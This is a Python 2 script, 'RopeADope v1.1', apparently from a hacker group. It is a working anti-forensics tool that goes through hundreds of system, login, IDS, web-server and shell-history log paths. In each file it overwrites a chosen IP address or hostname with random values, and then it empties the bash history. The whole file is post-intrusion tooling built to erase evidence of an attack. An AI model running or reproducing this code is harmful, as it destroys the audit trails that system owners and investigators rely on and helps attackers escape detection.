#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# Ropeadope.py -- RopeADope v1.1                                               #
#                                                                              #
# DATE                                                                         #
# 04/20/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# A linux log cleaner                                                          #
#                                                                              #
# AUTHOR                                                                       #
# pr1me [at] highhacksociety [dot] com                                         #
# http://www.nullsecurity.net/ - http://www.highhacksociety                    #
#                                                                              #
################################################################################                                                                          #

import sys
import os
import re
import random
import time
import StringIO
import commands
import mmap

def banner():
	print """

 888888ba                               .d888888  888888ba                              
 88     8b                             d8'    88  88     8b                             
a88aaaa8P' .d8888b.  88d888b. .d8888b. 88aaaaa88a 88     88 .d8888b.  88d888b. .d8888b. 
 88    8b. 88'   88  88'   88 88ooood8 88     88  88     88 88'   88  88'   88 88ooood8 
 88     88 88.  .88  88.  .88 88.  ... 88     88  88    .8P 88.  .88  88.  .88 88.  ... 
 dP     dP  88888P'  88Y888P'  88888P' 88     88  8888888P   88888P'  88Y888P'  88888P' 
oooooooooooooooooooo~88~ooooooooooooooooooooooooooooooooooooooooooooo~88~ooooooooooooooo
                     dP                                               dP            v1.1

          [--]          RopeADope v1.1 - Linux Log Cleaner          [--]
          [--]                   Written By: pr1me                  [--]
          [--]               http://www.nullsecurity.net            [--]
  
"""

def IPChk(ipaddr):
	pattern = r"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
	if re.match(pattern, ipaddr):
		return True
	else:
		return False

def randomIP():
	global randIP
	randIP = '.'.join([str(random.randint(1,254)) for x in range(4)])

def randomHost():
	global randhost
	beginning = ''.join(random.choice("abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789") for x in range(8))
	end = ['.aero','.arpa','.asia','.biz','.cat','.com','.coop','.edu','.eu','.gov','.info','.int','.jobs','.mil','.mobi','.museum','.name','.net','.org','.post','.pro','.tel','.travel','.xxx','.ac','.ad','.ae','.af','.ag','.ai','.al','.am','.an','.ao','.aq','.ar','.as','.at','.au','.aw','.ax','.az','.ba','.bb','.bd','.be','.bf','.bg','.bh','.bi','.bj','.bm','.bn','.bo','.br','.bs','.bt','.bv','.bw','.by','.bz','.ca','.cc','.cd','.cf','.cg','.ch','.ci','.ck','.cl','.cm','.cn','.co','.cr','.cs','.cu','.cv','.cx','.cy','.cz','.dd','.de','.dj','.dk','.dm','.do','.dz','.ec','.ee','.eg','.eh','.er','.es','.et','.eu','.fi','.fj','.fk','.fm','.fo','.fr','.ga','.gb','.gd','.ge','.gf','.gg','.gh','.gi','.gl','.gm','.gn','.gp','.gq','.gr','.gs','.gt','.gu','.gw','.gy','.hk','.hm','.hn','.hr','.ht','.hu','.id','.ie','.il','.im','.in','.io','.iq','.ir','.is','.it','.je','.jm','.jo','.jp','.ke','.kg','.kh','.ki','.km','.kn','.kp','.kr','.kw','.ky','.kz','.la','.lb','.lc','.li','.lk','.lr','.ls','.lt','.lu','.lv','.ly','.ma','.mc','.md','.me','.mg','.mh','.mk','.ml','.mm','.mn','.mo','.mp','.mq','.mr','.ms','.mt','.mu','.mv','.mw','.mx','.my','.mz','.na','.nc','.ne','.nf','.ng','.ni','.nl','.no','.np','.nr','.nu','.nz','.om','.pa','.pe','.pf','.pg','.ph','.pk','.pl','.pm','.pn','.pr','.ps','.pt','.pw','.py','.qa','.re','.ro','.rs','.ru','.rw','.sa','.sb','.sc','.sd','.se','.sg','.sh','.si','.sj','.sk','.sl','.sm','.sn','.so','.sr','.st','.su','.sv','.sy','.sz','.tc','.td','.tf','.tg','.th','.tj','.tk','.tl','.tm','.tn','.to','.tp','.tr','.tt','.tv','.tw','.tz','.ua','.ug','.uk','.um','.us','.uy','.uz','.va','.vc','.ve','.vg','.vi','.vn','.vu','.wf','.ws','.ye','.yt','.yu','.za','.zm','.zr','.zw']
	randend = random.choice(end)
	randhost = beginning + randend

def searchanddestroy():
	if hitme == 1:
		randomIP()
		for log in goodLogs:
			datafile = file(log)
			for line in datafile:
				if ipaddr in line:
					print "\n[*] Found IP in",log
					f = open(log, "rb+")
					size = os.path.getsize(log)
					dizz = mmap.mmap(f.fileno(), size)
					place = dizz.find(ipaddr)
					if place == -1:
						dizz.close()
					else:
						print "\tEditing IP"
						dizz.seek(place)
						dizz.write(randIP)
						dizz.close()
					print "\n[*] This House Is Clean.\n"
	elif hitme == 2:
		randomHost()
		for log in goodLogs:
			datafile = file(log)
			for line in datafile:
				if host in line:
					print "\n[*] Found Host in",log
					f = open(log, "rb+")
					size = os.path.getsize(log)
					dizz = mmap.mmap(f.fileno(), size)
					place = dizz.find(host)
					if place == -1:
						dizz.close()
					else:
						print "\tEditing Host"
						dizz.seek(place)
						dizz.write(randhost)
						dizz.close()
					print "\n[*] This House Is Clean.\n"
	else:
		sys.exit("You've fucked something up. PEBKAC!\n")

def searchanddestroy2():
	if hitme == 1:
		randomIP()
		for log2 in mlogz:
			datafile = file(log2)
			for line in datafile:
				if ipaddr in line:
					print "\n[*] Found IP in",log2
					f = open(log2, "rb+")
					size = os.path.getsize(log2)
					dizz = mmap.mmap(f.fileno(), size)
					place = dizz.find(ipaddr)
					if place == -1:
						dizz.close()
					else:
						print "\tEditing IP"
						dizz.seek(place)
						dizz.write(randIP)
						dizz.close()
					print "\n[*] This House Is Clean.\n"
	elif hitme == 2:
		randomHost()
		for log2 in mlogz:
			datafile = file(log2)
			for line in datafile:
				if host in line:
					print "\n[*] Found Host in",log2
					f = open(log2, "rb+")
					size = os.path.getsize(log2)
					dizz = mmap.mmap(f.fileno(), size)
					place = dizz.find(host)
					if place == -1:
						dizz.close()
					else:
						print "\tEditing Host"
						dizz.seek(place)
						dizz.write(randhost)
						dizz.close()
					print "\n[*] This House Is Clean.\n"
	else:
		sys.exit("You've fucked something up. PEBKAC!\n")

def validlogs():
	global logfilez
	#List of log files - Add your own or use the custom field option 
	logfilez = ['/var/adm/utmp','/usr/adm/utmp','/etc/utmp','/var/log/utmp','/var/run/utmp','/var/adm/utmp','/var/run/utmp','/usr/var/adm/utmp','/var/adm/wtmp','/usr/adm/wtmp','/etc/wtmp','/var/log/wtmp','/var/adm/wtmp','/var/run/wtmp','/usr/var/adm/wtmp','/var/adm/utmpx','/usr/adm/utmpx','/usr/run/utmpx','/etc/utmpx','/var/log/utmpx','/var/run/utmpx','/usr/var/adm/utmpx','/var/adm/wtmpx','/usr/adm/wtmpx','/etc/wtmpx','/var/log/wtmpx','/var/run/wtmpx','/usr/adm/wtmpx','/usr/var/adm/wtmpx','/var/adm/lastlog','/usr/adm/lastlog','/etc/lastlog','/var/log/lastlog','/usr/adm/lastlog','/usr/run/lastlog','/usr/var/adm/lastlog','/var/adm/pacct','/var/account/pacct','/var/log/acct','/var/log/pacct','/var/adm/acct','/var/adm/pacct','/var/account/acct','/usr/adm/acct','/var/log/prelude.log','/var/log/prelude/prelude.log','/var/adm/prelude/prelude.log','/var/adm/prelude/log/prelude.log','/var/adm/log/prelude.log','/var/ids/log/prelude.log','/var/ids/prelude/log/prelude.log','/var/ids/prelude.log','/var/prelude/prelude.log','/var/prelude/log/prelude.log','/home/log/prelude.log','/home/ids/log/prelude.log','/home/prelude/log/prelude.log','/home/ids/prelude.log','/home/prelude/prelude.log','/home/log/prelude.log','/usr/local/var/log/prelude.log','/var/log/prelude-xml.log','/var/log/prelude/prelude-xml.log','/var/adm/prelude/prelude-xml.log','/var/adm/prelude/log/prelude-xml.log','/var/adm/log/prelude-xml.log','/var/ids/log/prelude-xml.log','/var/ids/prelude/log/prelude-xml.log','/var/ids/prelude-xml.log','/var/prelude/prelude-xml.log','/var/prelude/log/prelude-xml.log','/home/log/prelude-xml.log','/home/ids/log/prelude-xml.log','/home/prelude/log/prelude-xml.log','/home/ids/prelude-xml.log','/home/prelude/prelude-xml.log','/home/log/prelude-xml.log','/usr/local/var/log/prelude-xml.log','/var/log/samba/log.smbd','/var/log/samba/log.nmbd','/var/log/log.smbd','/var/log/log.nmbd','/var/log/smb/log.smbd','/var/log/smb/log.nmbd','/home/samba/log.smbd','/home/samba/log.nmbd','/home/samba/log/log.smbd','/home/samba/log/log.nmbd','/home/samba/logs/log.smbd','/home/samba/logs/log.nmbd','/var/log/snort/snort.alert','/var/log/snort.alert','/var/log/ids/snort.alert','/var/ids/snort/snort.alert','/var/ids/snort.alert','/var/snort/snort.alert','/home/snort/snort.alert','/home/snort/log/snort.alert','/home/log/snort/snort.alert','/home/log/snort.alert','/home/ids/snort/snort.alert','/home/ids/snort.alert','/usr/local/ids/snort.alert','/usr/local/var/snort.alert','/usr/local/snort/snort.alert','/usr/local/var/log/snort.alert','/usr/local/snort/log/snort.alert','/usr/local/ids/log/snort.alert','/usr/local/log/snort.alert','/usr/local/log/snort/snort.alert','/var/log/apache2/audit_log','/var/log/apache1/audit_log','/var/log/apache/audit_log','/home/apache2/log/audit_log','/home/apache1/log/audit_log','/home/apache/log/audit_log','/home/http/log/audit_log','/home/httpd/log/audit_log','/var/log/http/audit_log','/var/log/httpd/audit_log','/usr/http/log/audit_log','/usr/httpd/log/audit_log','/usr/local/http/log/audit_log','/usr/local/httpd/log/audit_log','/usr/local/apache/log/audit_log','/usr/local/apache2/log/audit_log','/usr/local/apache1/log/audit_log','/var/www/log/audit_log','/var/http/log/audit_log','/var/httpd/log/audit_log','/var/apache/log/audit_log','/var/apache2/log/audit_log','/var/apache1/log/audit_log','/root/.bash_history','/root/.history','/root/.sh_history','/.bash_history','/.history','/.sh_history','/tmp/.bash_history','/tmp/.sh_history','/tmp/.history','/home/apache/.bash_history','/home/apache/.sh_history','/home/apache/.history','/home/apache1/.bash_history','/home/apache1/.sh_history','/home/apache1/.history','/home/apache2/.bash_history','/home/apache2/.sh_history','/home/apache2/.history','/home/httpd/.bash_history','/home/httpd/.sh_history','/home/httpd/.history','/home/ftpd/.bash_history','/home/ftpd/.sh_history','/home/ftpd/.history','/var/log/apache2/access_log','/var/log/apache2/access_log.1','/var/log/apache2/access_log.2','/var/log/apache2/error_log','/var/log/apache2/error_log.1','/var/log/apache2/error_log.2','/var/log/apache2/ssl_access_log','/var/log/apache2/ssl_access_log.1','/var/log/apache2/ssl_access_log.2','/var/log/apache2/ssl_error_log','/var/log/apache2/ssl_request_log','/var/log/apache2/request_log','/var/log/apache/access_log','/var/log/apache/access_log.1','/var/log/apache/access_log.2','/var/log/apache/error_log','/var/log/apache/error_log.1','/var/log/apache/error_log.2','/var/log/apache/ssl_access_log','/var/log/apache/ssl_error_log','/var/log/apache/ssl_request_log','/var/log/apache/request_log','/var/log/apache1/access_log','/var/log/apache1/error_log','/var/log/apache1/ssl_access_log','/var/log/apache1/ssl_error_log','/var/log/apache1/ssl_request_log','/var/log/apache1/request_log','/var/www/log/access_log','/var/www/log/error_log','/var/www/log/ssl_access_log','/var/www/log/ssl_error_log','/var/www/log/ssl_request_log','/var/www/log/request_log','/var/apache2/access_log','/var/apache2/error_log','/var/apache2/ssl_access_log','/var/apache2/ssl_error_log','/var/apache2/ssl_request_log','/var/apache2/request_log','/home/apache2/access_log','/home/apache2/error_log','/home/apache2/ssl_access_log','/home/apache2/ssl_error_log','/home/apache2/ssl_request_log','/home/apache2/request_log','/var/web/log/access_log','/var/web/log/error_log','/var/web/log/ssl_access_log','/var/web/log/ssl_error_log','/var/web/log/ssl_request_log','/var/web/log/request_log','/var/apache/access_log','/var/apache/error_log','/var/apache/ssl_access_log','/var/apache/ssl_error_log','/var/apache/ssl_request_log','/var/apache/request_log','/home/apache/access_log','/home/apache/error_log','/home/apache/ssl_access_log','/home/apache/ssl_error_log','/home/apache/ssl_request_log','/home/apache/request_log','/var/apache1/access_log','/var/apache1/error_log','/var/apache1/ssl_access_log','/var/apache1/ssl_error_log','/var/apache1/ssl_request_log','/var/apache1/request_log','/home/apache1/access_log','/home/apache1/error_log','/home/apache1/ssl_access_log','/home/apache1/ssl_error_log','/home/apache1/ssl_request_log','/home/apache1/request_log','/usr/apache1/error_log','/usr/apache1/ssl_access_log','/usr/apache1/ssl_error_log','/usr/apache1/ssl_request_log','/usr/apache1/request_log','/usr/local/apache1/error_log','/usr/local/apache1/ssl_access_log','/usr/local/apache1/ssl_error_log','/usr/local/apache1/ssl_request_log','/usr/local/apache1/request_log','/usr/apache2/error_log','/usr/apache2/ssl_access_log','/usr/apache2/ssl_error_log','/usr/apache2/ssl_request_log','/usr/apache2/request_log','/usr/local/apache2/error_log','/usr/local/apache2/ssl_access_log','/usr/local/apache2/ssl_error_log','/usr/local/apache2/ssl_request_log','/usr/local/apache2/request_log','/usr/apache/error_log','/usr/apache/ssl_access_log','/usr/apache/ssl_error_log','/usr/apache/ssl_request_log','/usr/apache/request_log','/usr/local/apache/error_log','/usr/local/apache/ssl_access_log','/usr/local/apache/ssl_error_log','/usr/local/apache/ssl_request_log','/usr/local/apache/request_log','/usr/local/httpd/access_log','/usr/local/httpd/ssl_access_log','/usr/local/httpd/error_log','/usr/local/httpd/ssl_error_log','/usr/local/httpd/ssl_request_log','/home/httpd/access_log','/home/httpd/ssl_access_log','/home/httpd/error_log','/home/httpd/ssl_error_log','/var/adm/SYSLOG','/var/adm/sulog','/var/adm/utmp','/var/adm/utmpx','/var/adm/wtmp','/var/adm/wtmpx','/var/adm/lastlog/username','/usr/spool/lp/log','/var/adm/lp/lpd-errs','/usr/lib/cron/log','/var/adm/loginlog','/var/adm/pacct','/var/adm/dtmp','/var/adm/acct/sum/loginlog','/var/adm/X0msgs','/var/adm/crash/vmcore','/var/adm/crash/unix','/var/adm/pacct','/var/adm/wtmp','/var/adm/dtmp','/var/adm/qacct','/var/adm/sulog','/var/adm/ras/errlog','/var/adm/ras/bootlog','/var/adm/cron/log','/etc/utmp','/etc/security/lastlog','/etc/security/failedlogin','/usr/spool/mqueue/syslog','/var/adm/messages','/var/adm/aculogs','/var/adm/aculog','/var/adm/sulog','/var/adm/vold.log','/var/adm/wtmp','/var/adm/wtmpx','/var/adm/utmp','/var/adm/utmpx','/var/adm/log/asppp.log','/var/log/syslog','/var/log/POPlog','/var/log/authlog','/var/log/auth1.log','/var/adm/pacct','/var/lp/logs/lpsched','/var/lp/logs/lpNet','/var/lp/logs/requests','/var/cron/log','/var/saf/_log','/var/saf/port/log','/var/adm/utmp','/var/log/utmp','/var/run/utmp','/var/adm/utmp','/var/run/utmp','/usr/var/adm/utmp','/var/adm/wtmp','/var/log/wtmp','/var/adm/wtmp','/var/run/wtmp','/usr/var/adm/wtmp','/var/adm/utmpx','/var/log/utmpx','/var/run/utmpx','/usr/var/adm/utmpx','/var/adm/wtmpx','/var/log/wtmpx','/var/run/wtmpx','/usr/var/adm/wtmpx','/var/adm/lastlog','/var/log/lastlog','/usr/var/adm/lastlog','/var/adm/pacct','/var/account/pacct','/var/log/acct','/var/log/pacct','/var/adm/acct','/var/adm/pacct','/var/account/acct','/var/log/prelude.log','/var/log/prelude/prelude.log','/var/adm/prelude/prelude.log','/var/adm/prelude/log/prelude.log','/var/adm/log/prelude.log','/var/ids/log/prelude.log','/var/ids/prelude/log/prelude.log','/var/ids/prelude.log','/var/prelude/prelude.log','/var/prelude/log/prelude.log','/usr/local/var/log/prelude.log','/var/log/prelude-xml.log','/var/log/prelude/prelude-xml.log','/var/adm/prelude/prelude-xml.log','/var/adm/prelude/log/prelude-xml.log','/var/adm/log/prelude-xml.log','/var/ids/log/prelude-xml.log','/var/ids/prelude/log/prelude-xml.log','/var/ids/prelude-xml.log','/var/prelude/prelude-xml.log','/var/prelude/log/prelude-xml.log','/usr/local/var/log/prelude-xml.log','/var/log/samba/log.smbd','/var/log/samba/log.nmbd','/var/log/log.smbd','/var/log/log.nmbd','/var/log/smb/log.smbd','/var/log/smb/log.nmbd','/var/log/snort/snort.alert','/var/log/snort.alert','/var/log/ids/snort.alert','/var/ids/snort/snort.alert','/var/ids/snort.alert','/var/snort/snort.alert','/usr/local/var/snort.alert','/usr/local/var/log/snort.alert','/var/log/apache2/audit_log','/var/log/apache1/audit_log','/var/log/apache/audit_log','/var/log/http/audit_log','/var/log/httpd/audit_log','/var/www/log/audit_log','/var/http/log/audit_log','/var/httpd/log/audit_log','/var/apache/log/audit_log','/var/apache2/log/audit_log','/var/apache1/log/audit_log','/var/log/apache2/access_log','/var/log/apache2/access_log.1','/var/log/apache2/access_log.2','/var/log/apache2/error_log','/var/log/apache2/error_log.1','/var/log/apache2/error_log.2','/var/log/apache2/ssl_access_log','/var/log/apache2/ssl_access_log.1','/var/log/apache2/ssl_access_log.2','/var/log/apache2/ssl_error_log','/var/log/apache2/ssl_request_log','/var/log/apache2/request_log','/var/log/apache/access_log','/var/log/apache/access_log.1','/var/log/apache/access_log.2','/var/log/apache/error_log','/var/log/apache/error_log.1','/var/log/apache/error_log.2','/var/log/apache/ssl_access_log','/var/log/apache/ssl_error_log','/var/log/apache/ssl_request_log','/var/log/apache/request_log','/var/log/apache1/access_log','/var/log/apache1/error_log','/var/log/apache1/ssl_access_log','/var/log/apache1/ssl_error_log','/var/log/apache1/ssl_request_log','/var/log/apache1/request_log','/var/www/log/access_log','/var/www/log/error_log','/var/www/log/ssl_access_log','/var/www/log/ssl_error_log','/var/www/log/ssl_request_log','/var/www/log/request_log','/var/apache2/access_log','/var/apache2/error_log','/var/apache2/ssl_access_log','/var/apache2/ssl_error_log','/var/apache2/ssl_request_log','/var/apache2/request_log','/var/web/log/access_log','/var/web/log/error_log','/var/web/log/ssl_access_log','/var/web/log/ssl_error_log','/var/web/log/ssl_request_log','/var/web/log/request_log','/var/apache/access_log','/var/apache/error_log','/var/apache/ssl_access_log','/var/apache/ssl_error_log','/var/apache/ssl_request_log','/var/apache/request_log','/var/apache1/access_log','/var/apache1/error_log','/var/apache1/ssl_access_log','/var/apache1/ssl_error_log','/var/apache1/ssl_request_log','/var/apache1/request_log','/var/log','/var/adm','/var/spool/mqueue','/var/mail','/var/log/emerge.log','/var/log/Xorg.0.log','/root/.bash_history','/root/.bash_logout','/usr/local/apache/logs','/usr/local/apache/log','/var/apache/logs','/var/apache/log','/var/run/utmp','/var/logs','/var/log','/var/adm','/etc/wtmp','/etc/utmp','/var/log/lastlog','/var/log/syslog','/var/log/messages','/var/log/httpd/access_log','/var/log/httpd/access.log','/var/log/httpd/error_log','/var/log/httpd/error.log','/var/log/apache2/access_log','/var/log/apache2/access.log','/var/log/apache2/error.log','/var/log/apache2/error_log','/var/log/wtmp','/var/log/secure','/var/log/xferlog','/var/log/auth.log','/var/log/lighttpd/lighttpd.error.log','/var/log/lighttpd/lighttpd.access.log','/var/run/utmp','/var/www/logs/access_log','/var/www/logs/access.log','/var/www/logs/error_log','/var/www/logs/error.log','/var/log/apache/access_log','/var/log/apache/access.log','/var/log/apache/error_log','/var/log/apache/error.log','/var/log/yum.log','/etc/httpd/logs/access_log','/etc/httpd/logs/access.log','/etc/httpd/logs/error_log','/etc/httpd/logs/error.log']
	global goodLogs
	goodLogs = []
	
	print "[*] Checking for active log files\n"
	for a in logfilez:
		if os.path.isfile(a) == True:
			goodLogs.append(a)
	if len(goodLogs)>0:
		print "[*] Active logs files found:",len(goodLogs)
		for b in goodLogs:
			print "\t"+b
	else:
		print "[-] No active log files found"
		sys.exit()

def morelogz():
	global mlogz
	mlogz = []
	mlogzcheck = []
	os.chdir("/")
	print "[*] Looking for more log files..."
	logfilez2 = StringIO.StringIO(commands.getstatusoutput('find . -iname *.log -print')[1]).readlines()	
	if len(logfilez2)>0:
		for a in logfilez2:
			foo = a.strip('\n')
     			mlogzcheck.append(foo)
		for b in mlogzcheck:
			if os.path.isfile(b) == True:
				mlogz.append(b)
	print "\t[*] Found:",len(mlogz),"extra logfiles"
	return mlogz

def main():
	banner()
	print ""
	if os.geteuid() != 0:
		print "\nNot running as root. Only logz accessible by non privileged users will be edited."
		
	raw_input("Press enter to get started...\n")
	
	validlogs()
	
	choice = raw_input("\nDo you want to search for more logs? [yes or no] ")
	if choice == "yes" or choice == "YES" or choice == "Yes":
		hollaback = 1
		morelogz()
	elif choice == "no" or choice == "NO" or choice == "No":
		hollaback = 2
		pass
	else:
		sys.exit("It's really not that difficult. Choose either yes or no fucker!\n")
		
	global hitme
	global ipaddr
	global host
	choice1 = raw_input("\nWould you like to remove a IP address or Hostname? [ip or hostname] ")
	if choice1 == "IP" or choice1 == "ip":
		hitme = 1
		ipaddr = raw_input("\tWhat IP address would you like removed from the logs? ")
		while IPChk(ipaddr) != True:
			print "\n\tInvalid IP! Try again!"
			ipaddr = raw_input("\tWhat IP address would you like removed from the logs? ")
		else:
			if hollaback == 1:
				searchanddestroy()
				searchanddestroy2()
			else:
				searchanddestroy()
	elif choice1 == "HOSTNAME" or choice1 == "hostname":
		hitme = 2
		host = raw_input("\tWhat Hostname would you like removed from the logs? ")
		if hollaback == 1:
			searchanddestroy()
			searchanddestroy2()
		else:
			searchanddestroy()
	else:
		sys.exit("It's really not that difficult. Choose either ip or hostname fucker!\n")
		
	if os.geteuid() == 0:
		w = open("/root/.bash_history", 'w')
		w.write("")
		w.close()

	else:
		user = os.getenv('USERNAME')
		w = open("/home/"+user+"/.bash_history", 'w')
		w.write("")
		w.close()

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print "\n"
		sys.exit()
